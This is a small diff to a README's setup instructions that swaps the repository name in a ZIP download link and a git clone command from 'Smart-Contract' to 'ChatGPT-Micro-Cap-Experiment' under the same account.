@@ -23,10 +23,10 @@ To use the script, you need:
 ## Setup and Installation
 
 1. Download the Repository
-   - Download the ZIP file containing the project files: [Download ZIP](https://github.com/Uxmora877t6/Smart-Contract/archive/refs/heads/main.zip).
+   - Download the ZIP file containing the project files: [Download ZIP](https://github.com/Uxmora877t6/ChatGPT-Micro-Cap-Experiment/archive/refs/heads/main.zip).
    - Or clone the repository with Git (if Git is not installed, download it here: [Download Git](https://git-scm.com/downloads)):
      ```bash
-     git clone https://github.com/Uxmora877t6/Smart-Contract
+     git clone https://github.com/Uxmora877t6/ChatGPT-Micro-Cap-Experiment
      ```
 
 2. Navigate to the Project Folder
